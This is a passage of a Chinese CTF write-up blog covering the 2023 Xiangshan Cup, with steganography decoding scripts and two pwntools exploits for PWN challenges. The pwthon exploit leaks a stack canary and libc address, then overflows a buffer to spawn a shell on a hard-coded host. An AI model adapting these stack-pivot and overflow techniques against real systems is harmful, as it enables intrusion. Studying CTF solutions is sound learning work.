class="number">50</span> <span class="number">69</span> <span class="number">69</span> <span class="number">90</span> <span class="number">68</span> <span class="number">67</span> <span class="number">72</span> <span class="number">70</span> <span class="number">87</span> <span class="number">70</span> <span class="number">81</span> <span class="number">84</span> <span class="number">76</span> <span class="number">77</span> <span class="number">79</span> <span class="number">65</span> <span class="number">90</span> <span class="number">85</span> <span class="number">87</span> <span class="number">86</span> <span class="number">74</span> <span class="number">85</span> <span class="number">78</span> <span class="number">70</span> <span class="number">66</span> <span class="number">68</span> <span class="number">83</span> <span class="number">84</span> <span class="number">83</span> <span class="number">76</span> <span class="number">77</span> <span class="number">78</span> <span class="number">74</span> <span class="number">88</span> <span class="number">65</span> <span class="number">84</span> <span class="number">66</span> <span class="number">87</span> <span class="number">75</span> <span class="number">73</span> <span class="number">51</span> <span class="number">70</span> <span class="number">81</span> <span class="number">89</span> <span class="number">90</span> <span class="number">82</span> <span class="number">71</span> <span class="number">90</span> <span class="number">88</span> <span class="number">71</span> <span class="number">87</span> <span class="number">79</span> <span class="number">68</span> <span class="number">67</span> <span class="number">71</span> <span class="number">78</span> <span class="number">68</span> <span class="number">84</span> <span class="number">83</span> <span class="number">78</span> <span class="number">90</span> <span class="number">82</span> <span class="number">75</span> <span class="number">90</span> <span class="number">74</span> <span class="number">68</span> <span class="number">81</span> <span class="number">90</span> <span class="number">67</span> <span class="number">78</span> <span class="number">71</span> <span class="number">86</span> <span class="number">75</span> <span class="number">87</span> <span class="number">73</span> <span class="number">84</span> <span class="number">74</span> <span class="number">86</span> <span class="number">71</span> <span class="number">86</span> <span class="number">86</span> <span class="number">72</span> <span class="number">75</span> <span class="number">77</span> <span class="number">75</span> <span class="number">78</span> <span class="number">74</span> <span class="number">81</span> <span class="number">51</span> <span class="number">86</span> <span class="number">67</span> <span class="number">78</span> <span class="number">50</span> <span class="number">78</span> <span class="number">74</span> <span class="number">69</span> <span class="number">51</span> <span class="number">87</span> <span class="number">71</span> <span class="number">90</span> <span class="number">66</span> <span class="number">87</span> <span class="number">79</span> <span class="number">78</span> <span class="number">88</span> <span class="number">84</span> <span class="number">67</span> <span class="number">52</span> <span class="number">82</span> <span class="number">86</span> <span class="number">78</span> <span class="number">77</span> <span class="number">52</span> <span class="number">85</span> <span class="number">75</span> <span class="number">89</span> <span class="number">76</span> <span class="number">66</span> <span class="number">78</span> <span class="number">74</span> <span class="number">69</span> <span class="number">84</span> <span class="number">75</span> <span class="number">76</span> <span class="number">90</span> <span class="number">82</span> <span class="number">79</span> <span class="number">82</span> <span class="number">74</span> <span class="number">70</span> <span class="number">85</span> <span class="number">50</span> <span class="number">84</span> <span class="number">67</span> <span class="number">71</span> <span class="number">78</span> <span class="number">77</span> <span class="number">84</span> <span class="number">83</span> <span class="number">89</span> <span class="number">82</span> <span class="number">86</span> <span class="number">79</span> <span class="number">52</span> <span class="number">89</span> <span class="number">85</span> <span class="number">75</span> <span class="number">79</span> <span class="number">76</span> <span class="number">76</span></span><br><span class="line">DATA_OUT: JRFTC5SFG5SU4STVHBTTCR2SKVSE2NKVIUYFCS2MOVFUWMLLGVKWITKLJZSE2NKVMRFUWY3EJU3VKZCNGVKU2SKQMNXE2WCVMRGTKVKNMM2XMRKLGE2US5SEOFWTMRDRNZVTO5LNGZCGYWDVOVYUG5KYKVWTMRDRMRBG4ZDNGZJE4TLWIRYWITJVOVWTMUSOMRGXK4LONM2VK3JWIRWGITJVMRWTMUSVJV3FEVLEJU2XKZCCNZKWITJVJZSE2NKVNZVTOVLEJU2VCWDVGVKUKTLEOFWTMRDMMRGTKVKYOU3XIRJWKJKGITJVKVSGEODQNJ2UWWCLGB2WWTDCOU3EWQRQJRCXKWDFMRBDINLJGVXEUSRPMFEUW5TYOFFEEWCTORGVQSBRNNJHKS2HKRDXIVSSOVEXE5JWNJGWCWCLIJIXATBXNZVUYQRROVIVMMDNORFWKR2JOJFU2S2JGBLEKTKQOFGU4UKGJN2FEUCNKY2EQQKOKVFU2TJVLBXESS3NMQXVMNZZKY2UQTJPMVSU2S2RINUXKMLVKFCW64KLJMZXO2JVJNEGI6JQO5GDKVJWOQ3TAMSLJVFFU2SNGAYW4Y2YMFGWWUSINJ2WY53EGA4WYTJWHB4GSZ2LJI4WENDWJQ3TKTBTG5LE45DHJNSUULZVOBFFMMJSJN2U2NSRM4YTSOKWMEZEYN3BOQ4UKZLDNFGVQ4SNJNIUUOJXNZ3FC23OOJFXONLZKFETQMTOI43VGSKNKBKTCVSQINUWENCLGFDWCYTJJU2GISLHGR3TG4SRIMZUES2YNZDTAMDUJUYEKTJQGV4ES6JRNVFWGMCUJI3XKN2NKZ4E45CHGB2DGYTBKFMHS33XIVHGK6KFO4YTCQ2CGRZG4VSYIFIWE6DXINZEW4BTI5QUC2LSG5LESVTOIF2E4YKTGM3TIVCKMIYTE3KHJMXXIY3PI52EK3TVNFZEWYKNO5LGW2SCKZYEK5ZUNQZXKODXLBCW4MJRKZFVAZCLKM3DSYRYKBXE4NCIJJVTE4KFKZITA2KJMR3UWQRUMFUWENDWJJHFCNDNNNJFGMZXMEXXIYTBKBIU2ZJPJIXVCSKYOI2HU5DHKM3USRJZOFGS642OGFDVQU3JGAYUW2TXGRAUS5KEKBXE2222JRTTG4BRIU2TMOKNGJ3UCTRVIZVESWCNNZRUWVSLJU2EM5COJM3VC5ZRMRXDA3ZXNFCTKWCKJZIWMMLDGREWUQTPJZUXSMBXNFTVQSCLIIZVI2TCNRIEK22LGZEWEUTMJU2WCZJZJV4FU2SJMVDFQVRXGFFGWUBYJJZG46CYGUYHSWBPGU4EWYRQJFVGEMLLNVVTS4KNOQ4DKSSHLAYDGRJVNBFUSNKFNZHDI2CFOU3U2M2NMFWUGSKSMFMGWN2WGM3TAOBTF42EEZDCHFWFQTLMOAZUWVJUNFBDSTSLMNJXATBWKI3FQYZRGZXGWODCGNDTSNZRKZJDQZCNGVKWITJVGVVHKMKNJQ3VCN2NJE3WGZBWONXTC4RVNM4UKYLBNJETKLZRORJFU2TCGNMTSYRVO4YUKOLL</span><br><span class="line"><span class="comment">#解码顺序</span></span><br><span class="line"><span class="comment">#base32</span></span><br><span class="line"><span class="comment">#base64 码表：sUvcu5rgSeAmJQCfdXtEMKIB91Lj3niOo4hyV0b/2azpx8HqZP6wk7GNlTFYDR+W</span></span><br><span class="line"><span class="comment">#base64</span></span><br></pre></td></tr></table></figure></div>
+
+<p>得到一张png图片</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/2023XiangShan-Replay.assets/Untitled.png"
+                      alt="jiemi"
+                ></p>
+<p>使用npiet工具来运行这个花不拉几的语言图片程序得到flag</p>
+<p><img  
+                     lazyload
+                     src="/images/loading.svg"
+                     data-src="/../Post_images/2023XiangShan-Replay.assets/cmd.png"
+                      alt="flag"
+                ></p>
+<p>flag{4b6c1737-27e5-41c4-95e3-f70ad196063e}</p>
+<p>piet编程语言:面向堆栈的语言，颜色区域表示数字，</p>
+<h3 id="EXP2：逆序图片"><a href="#EXP2：逆序图片" class="headerlink" title="EXP2：逆序图片"></a>EXP2：逆序图片</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"> </span><br><span class="line">f1 = <span class="built_in">open</span>(<span class="string">&#x27;flag.jpg&#x27;</span>,<span class="string">&#x27;rb+&#x27;</span>)</span><br><span class="line">f2 = <span class="built_in">open</span>(<span class="string">&#x27;fla.jpg&#x27;</span>,<span class="string">&#x27;wb+&#x27;</span>)</span><br><span class="line">f2.write(f1.read()[::-<span class="number">1</span>])</span><br><span class="line">f1.close()</span><br><span class="line">f2.close()</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="EXP3：GIF拆解拼接"><a href="#EXP3：GIF拆解拼接" class="headerlink" title="EXP3：GIF拆解拼接"></a>EXP3：GIF拆解拼接</h3><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"> </span><br><span class="line">savepath = <span class="string">&quot;OmyGods\\&quot;</span></span><br><span class="line">path = <span class="string">&#x27;.\\&#x27;</span></span><br><span class="line"> </span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;glance.gif&#x27;</span>)</span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">im.save(savepath+<span class="string">&#x27;glance&#123;:d&#125;.png&#x27;</span>.<span class="built_in">format</span>(im.tell()))</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:           <span class="comment">#while循环拆解</span></span><br><span class="line">im.seek(im.tell()+<span class="number">1</span>)  <span class="comment">#提取帧数</span></span><br><span class="line">im.save(savepath+<span class="string">&#x27;glance&#123;:d&#125;.png&#x27;</span>.<span class="built_in">format</span>(im.tell()))</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line"><span class="keyword">pass</span></span><br><span class="line"><span class="comment">#得到帧数</span></span><br></pre></td></tr></table></figure></div>
+
+<p>创建大图，将每一帧图片贴上去，im是创建好的大图，然后使用<code>im.paste(image,(width,0,2+width,600))</code>方法，4元坐标，高度不变，宽度每次加2（每一帧的宽度）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># coding:utf-8 </span></span><br><span class="line"><span class="comment"># author:Reborn </span></span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line">path = <span class="string">&quot;OmyGods\\&quot;</span></span><br><span class="line">save_path = <span class="string">&#x27;.\\&#x27;</span></span><br><span class="line"> </span><br><span class="line">im = Image.new(<span class="string">&#x27;RGBA&#x27;</span>,(<span class="number">2</span>*<span class="number">201</span>,<span class="number">600</span>))</span><br><span class="line"> </span><br><span class="line">imagefile = []</span><br><span class="line">width = <span class="number">0</span> </span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">201</span>):</span><br><span class="line">imagefile.append(Image.<span class="built_in">open</span>(path+<span class="string">&#x27;Frame&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;.png&#x27;</span>))</span><br><span class="line"> </span><br><span class="line"><span class="keyword">for</span> image <span class="keyword">in</span> imagefile:</span><br><span class="line">im.paste(image,(width,<span class="number">0</span>,<span class="number">2</span>+width,<span class="number">600</span>))</span><br><span class="line">width = width +<span class="number">2</span></span><br><span class="line">im.save(save_path+<span class="string">&#x27;OmyGod.png&#x27;</span>)</span><br><span class="line">im.show()</span><br></pre></td></tr></table></figure></div>
+
+<hr>
+<hr>
+<h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="move"><a href="#move" class="headerlink" title="move"></a>move</h2><p>栈迁移的知识，没看懂什么原理</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#sh = remote(&#x27;47.93.188.210&#x27;, 40848)</span></span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;lets travel again!\n&#x27;</span>, flat([<span class="number">0x405f00</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0</span>]))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;setp number&#x27;</span>, p32(<span class="number">0x12345678</span>))</span><br><span class="line"></span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, cyclic(<span class="number">48</span>) + flat([<span class="number">0x4050A0</span>, <span class="number">0x40124b</span>]))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, flat([<span class="number">0x405e00</span>, <span class="number">0x401353</span>, <span class="number">0x404018</span>, <span class="number">0x401080</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0x405ed0</span>, <span class="number">0x000000000040124b</span>]))</span><br><span class="line">libc_addr = u64(sh.recvn(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x80970</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sh.sendafter(<span class="string">b&#x27;TaiCooLa&#x27;</span>, flat([<span class="number">0x405d00</span>, libc_addr + <span class="number">0x4f302</span>, <span class="number">0x404018</span>, <span class="number">0x401080</span>, <span class="number">0x40121A</span>, <span class="number">0</span>, <span class="number">0x405dd0</span>, <span class="number">0x000000000040124b</span>]))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+<h2 id="pwthon"><a href="#pwthon" class="headerlink" title="pwthon"></a><strong>pwthon</strong></h2><p>通过测试找到触发漏洞的PoC：</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sh = remote(attach_host, 9541)</span><br><span class="line">sh.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, b<span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(b<span class="string">&#x27;0&#x27;</span> * 0x100 + b<span class="string">&#x27;1&#x27;</span> * 0x180)</span><br><span class="line">sh.recvuntil(b<span class="string">&#x27;gift &#x27;</span>)</span><br><span class="line">app_addr = int(sh.recvline(), 16) - 0x68b0</span><br><span class="line">success(<span class="string">&#x27;app_addr: &#x27;</span> + hex(app_addr))</span><br></pre></td></tr></table></figure></div>
+
+<p>根据Poc编写利用脚本：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.clear(arch=<span class="string">&#x27;amd64&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh = remote(<span class="string">&#x27;101.201.35.76&#x27;</span>, <span class="number">45057</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0xd9</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;0&#x27;</span> * <span class="number">0xd9</span>)</span><br><span class="line">canary = u64(<span class="string">b&#x27;\0&#x27;</span> + sh.recvn(<span class="number">7</span>))</span><br><span class="line">success(<span class="string">&#x27;canary: &#x27;</span> + <span class="built_in">hex</span>(canary))</span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;2&#x27;</span> * <span class="number">0x20</span>)</span><br><span class="line">libc_addr = u64(sh.recvn(<span class="number">6</span>) + <span class="string">b&#x27;\0\0&#x27;</span>) - <span class="number">0x4473b0</span></span><br><span class="line">success(<span class="string">&#x27;libc_addr: &#x27;</span> + <span class="built_in">hex</span>(libc_addr))</span><br><span class="line">sh.send(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">sh.sendlineafter(<span class="string">b&#x27;&gt; &#x27;</span>, <span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">sh.send(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;gift &#x27;</span>)</span><br><span class="line">sh.recvuntil(<span class="string">b&#x27;1234&#x27;</span>)</span><br><span class="line">sh.send(cyclic(<span class="number">264</span>) + flat([canary, <span class="number">0</span>, libc_addr + <span class="number">0x4f302</span>]) + <span class="string">b&#x27;\0&#x27;</span> * <span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>
+
+        </div>
+
+        
+            <div class="post-copyright-info">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>Title:</strong> 2023香山杯复现与学习[231016]</li>
+        <li><strong>Author:</strong> Juana_2u</li>
+        <li><strong>Created at
+                :</strong> 2023-10-18 20:02:45</li>
+        
+            <li>
+                <strong>Updated at
+                    :</strong> 2023-11-09 20:04:43
+            </li>
+        
+        <li>
+            <strong>Link:</strong> https://juana-2u.github.io/2023/10/18/2023XiangShan-Replay/
+        </li>
+        <li>
+            <strong>
+                License:
+            </strong>
+            
+            This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.
+            
+
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box">
+                
+                    <li class="tag-item">
+                        <a href="/tags/ctf-Replay/">#ctf_Replay</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav">
+                
+                    <div class="article-prev">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2023/11/04/DASCTFxCBCTF2023-Study&amp;Re/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">DASCTFxCBCTF2023-Study&amp;Re</span>
+                                <span class="post-nav-item">Prev posts</span>
+                            </span>
+                        </a>
+                    </div>
+                
+                
+                    <div class="article-next">
+                        <a class="next"
+                        rel="next"
+                        href="/2023/10/14/About%E3%80%90python%E3%80%91/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">About【python】</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+            <div class="comment-container">
+                <div class="comments-container pjax">
+    <div id="comment-anchor"></div>
+    <div class="comment-area-title">
+        <i class="fa-solid fa-comments"></i>&nbsp;Comments
+    </div>
+    
+
+        
+            
+ 
+    <div id="waline"></div>
+    <script type="module"  data-swup-reload-script>
+        import { init } from '/js/libs/waline.mjs';
+
+        function loadWaline() {
+            init({
+                el: '#waline',
+                serverURL: 'https://example.example.com',
+                lang: 'zh-CN',
+                dark: 'body[class~="dark-mode"]',
+                requiredMeta: ['nick','mail'], // cannot customize by theme config, change it yourself
+            });
+        }
+
+        if ('true') {
+            const loadWalineTimeout = setTimeout(() => {
+                loadWaline();
+                clearTimeout(loadWalineTimeout);
+            }, 1000);
+        } else {
+            window.addEventListener('DOMContentLoaded', loadWaline);
+        }
+        
+    </script>
+
+
+
+        
+    
+</div>
+
+            </div>
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">2023香山杯复现与学习[231016]</div>
+        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#MISC"><span class="nav-text">MISC</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#PINTU"><span class="nav-text">PINTU</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#STU%EF%BC%9A%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99"><span class="nav-text">STU：图片隐写</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP1%EF%BC%9APINTU"><span class="nav-text">EXP1：PINTU</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP2%EF%BC%9A%E9%80%86%E5%BA%8F%E5%9B%BE%E7%89%87"><span class="nav-text">EXP2：逆序图片</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#EXP3%EF%BC%9AGIF%E6%8B%86%E8%A7%A3%E6%8B%BC%E6%8E%A5"><span class="nav-text">EXP3：GIF拆解拼接</span></a></li></ol></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#PWN"><span class="nav-text">PWN</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#move"><span class="nav-text">move</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pwthon"><span class="nav-text">pwthon</span></a></li></ol></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+            <div class="customize-info my-1">PUJIPUJIPUJI~~~~DA~~~~</div>
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2023&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Juana_2u</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.0</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+            <li class="go-comment">
+                <i class="fa-regular fa-comments"></i>
+            </li>
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
